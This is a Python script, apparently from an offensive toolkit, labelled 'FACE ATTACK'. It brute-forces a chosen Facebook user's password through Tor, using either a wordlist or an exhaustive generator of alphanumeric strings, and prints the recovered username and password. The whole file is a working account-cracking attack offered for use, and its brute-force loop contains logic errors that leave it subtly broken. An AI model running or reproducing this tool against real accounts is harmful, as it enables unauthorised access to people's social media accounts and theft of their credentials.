from tools.social_tools.facebook import facebook as face #tools.social_tools.
import os
import itertools

def main():
    os.system("clear")
    banner = """
            ================================
             ____             _____    ____
            |  __|           /  ___|  |  __|
            | |__     /\    |  /      | |__
            |  __|   /__\   | |       |  __|
            | |     / __ \  |  \___   | |__
            |_|    /_/  \_\  \_____|  |____| 

            ==========[FACE ATTACK]=========

    """
    print(banner)
    usr = input("[ENTER] enter the username: ")
    print("[FACE] starting tor")
    pasd = input("[ENTER] enter unhashed password to accses tor: ")
    os.system("sudo /etc/init.d/tor restart")
    print("1) worlist")
    print("2) pybrute")
    cho = int(input("[ENTER] enter choice: "))

    if cho == 1:
        path = input("[ENTER] enter full path to password list: ")
        f = open(path,"r").readlines()
        count = 0
        mx = len(f)
        r = str(mx)
        for x in f:
            count += 1
            x = x.replace("\n","")
            print("[FACE] attempt ("+str(count)+"/"+r+")")
            chk = face(usr, x, pasd)
            if chk == True:
                os.system("clear")
                print(banner)
                print("[FACE] got the user name and password")
                print("USR: ", usr)
                print("PSWD: ", x)
                print("[FACE] got password after ("+str(count)+") attempts")
                input("[ENTER] hit enter to continue")
                break
            else:
                pass
    elif cho == 2:
        mx = 8

        run_til = 0
        n = 0

        name = "tools/social_tools/face/"+usr+".txt"

        try:
            f = open(name,"r")
            num = f.readline()[0]
            f.close()
            run_til = int(num)
            print("[FACE] getting to where left off...")
        except FileNotFoundError:
            f = open(name,"x")
            f.close()

        temp = 0

        try:
            while mx != 64:
                count = 0
                PASSWORD_LIST = itertools.product("1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM", repeat=mx)

                for pas in PASSWORD_LIST:
                    n = n + 1
                    if temp == run_til:
                        pas = str(pas)
                        pas = pas.replace("')","")
                        pas = pas.replace("('","")
                        pas = pas.replace("'","")
                        pas = pas.replace(" ","")
                        pas = pas.replace(",","")
                        #print(pas)
                        u = str(pas)
                        count += 1
                        u = u.replace("\n","")
                        print("[FACE] attempt ("+str(count)+")")
                        print("[FACE] password ("+u+")")
                        chk = face(usr, u, pasd)
                        if chk == True:
                            os.system("clear")
                            print(banner)
                            print("[FACE] got the user name and password")
                            print("USR: ", usr)
                            print("PSWD: ", u)
                            print("[FACE] got password after ("+str(count)+") attempts")
                            input("[ENTER] hit enter to continue")
                            break
                        else:
                            pass
                    else:
                        temp = temp + 1
            mx = mx + 1
        except KeyboardInterrupt:
            f = open(name,"w")
            f.write(str(n))
            f.close()
    else:
        pass
    print("[!] done!")